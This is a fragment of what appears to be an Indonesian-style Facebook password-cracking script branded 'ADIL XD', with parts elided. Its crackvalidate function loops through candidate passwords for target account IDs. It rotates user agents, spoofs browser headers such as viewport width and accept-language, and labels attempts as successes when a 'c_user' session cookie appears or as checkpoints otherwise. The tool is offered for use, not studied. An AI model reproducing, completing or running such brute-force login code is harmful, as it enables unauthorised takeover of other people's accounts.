...
{puti}Update   : {biru} ADIL XD && TARI XD && TATA GANS && ADIL XD
{puti}Script : {biru}Facebook
{puti}Tools    : {biru}ADIL XD && TARI XD && TATA GANS && ADIL XD
...
def crackvalidate(idf,pwx,url):
	...
	rc = random.choice
	emot = rc(["🥸",])
	prog.update(des,description=f"\r[bold green]ADIL_XD 𝐯𝟏[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des)
	for pw in pwx:
		try:
			ua = rc(ugen)
		...
		'viewport-width': f'{str(rr(300,999))}',
	     ...
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'{biru} ✅ {hijo} ADIL_XD•ｓｕｋｓｅｓ') 
				print(f'{puti}') 
				...
				print(f'{biru} ❌ {kun} ADIL_XD•ｃｈｅｃｋｐｏｉｎ') 
				print(f'{puti}') 
